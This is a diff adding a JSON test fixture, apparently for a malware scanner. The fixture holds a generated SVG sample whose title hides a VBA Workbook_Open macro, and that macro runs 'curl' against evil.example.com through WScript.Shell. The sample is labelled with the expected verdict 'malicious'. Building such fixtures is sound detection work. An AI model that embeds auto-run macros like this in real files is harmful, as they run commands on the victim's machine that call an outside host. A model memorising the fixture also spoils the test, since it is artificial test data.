@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::17::binary-variations::2",
+  "base_sample_id": "exp::document-office::17",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 1482583730,
+  "content": "<svg xmlns=\"http://www.w3.org/2000/svg\"><title>Private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run \"curl http://evil.example.com/\"\nEnd Sub\n</title><circle r=\"50\"/></svg>",
+  "content_hash": "e4635bce2553c29920d61d0a79ce20b4327d494b44c40bef28d047f97a353544",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:svg",
+  "difficulty": "advanced"
+}
